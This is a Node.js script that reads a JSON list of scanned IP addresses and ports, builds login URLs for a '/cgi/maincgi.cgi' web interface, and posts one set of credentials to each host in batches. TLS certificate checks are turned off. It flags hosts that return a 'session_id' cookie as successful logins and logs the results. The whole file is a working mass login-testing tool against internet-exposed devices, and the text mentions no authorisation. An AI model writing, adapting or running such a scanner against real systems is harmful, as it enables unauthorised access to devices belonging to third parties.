if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config()
}

const axios = require('axios')
const iconv = require('iconv-lite')
const https = require('https')
const fsPromise = require('fs/promises')
const fs = require('fs')
const dayjs = require('dayjs')

function PostConstructor(payloads) {
  this.payloads = payloads

  //  發送登入請求
  this.Request = async function(url) {
    console.log('POST', url)
    const httpsAgent = new https.Agent({
      rejectUnauthorized: false
    })
    
    const axiosConfig = {
      httpsAgent,
      responseType: 'arraybuffer',
      timeout: 10000, // 超過10秒沒回應
      maxContentLength: 10000000
    }

    try {
      const response = await axios.post(url, {
        'username': process.env.ACCOUNT,
        'passwd': process.env.PASSWORD,
        'loginSubmitIpt': 'loginSubmitIpt'
      }, axiosConfig)
      // const decodedData = iconv.decode(response.data, 'gb2312')  // 轉換字型編碼

      return response.headers['set-cookie']
    } catch (err) {
      if (err.code === 'ECONNABORTED') {
        throw new Error(`Request timed out: ${err.message}`)
      } else {
        throw new Error(`Error: ${err.message}`)
      }
    }
  }

  //  從response特徵判斷是否成功登入
  this.CheckResponseResult = async function(url) {
    try {
      const response = await this.Request(url)
  
      if (response[0]) {
        if (!response[0].includes('session_id')) return [false, url]
  
        return response[0].includes('deleted') ? [false, 'isTarget', url] : [true, 'isTarget', url]
      }
  
      return undefined
    } catch(err) {
      return err.message
    }
  }

  // 從Json file獲取目標url
  this.getTargetUrls = function() {
    const targets = []
    this.payloads.data.forEach(data => {
      data.services.forEach(service => {
        if (service.service_name === 'HTTP') {
          const url = `https://${data.ip}:${service.port}/cgi/maincgi.cgi?Url=Index`
          targets.push(url)
        }
      })
    })

    return targets
  }

  // 將數據拆分成每組n個url
  this.chunkArray = function(array, chunkSize) {
    const result = []
    for (let i = 0; i < array.length; i += chunkSize) {
      result.push(array.slice(i, i + chunkSize))
    }
    return result
  }

  // 休息
  this.Sleep = async function(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
  }

  // 建立資料夾
  this.Makedirs = function(path, options) {
    if (!fs.existsSync(path)) {
      fs.mkdirSync(path, options);
    }
  }

  // 非同步發送請求
  this.sendRequests = async function() {
    this.Makedirs('files', { recursive: true })
    this.Makedirs('files/results', { recursive: true })

    const outputData = []
    const urls = this.getTargetUrls()
    for (const chunk of this.chunkArray(urls, 10)) {
      try {
        const requests = chunk.map(url => this.CheckResponseResult(url))
        const results = await Promise.allSettled(requests)
        
        outputData.push(...results)
        console.log('Batch completed:', results)
        await this.Sleep(5000) // 等待5秒
      } catch (err) {
        console.log(err)
      }
    }
    
    await fsPromise.appendFile(`./files/results/${dayjs().format('YYYY-MM-DD')}.json`, JSON.stringify(outputData))
  }
}

const payloads = require(process.env.PAYLOADS_FILE) // 獲取urls payloads之JSON檔案
const postInstance = new PostConstructor(payloads)

postInstance.sendRequests()
  .then(() => {
    console.log('All requests completed.')
  })
  .catch(error => {
    console.error('Error:', error.message)
  })
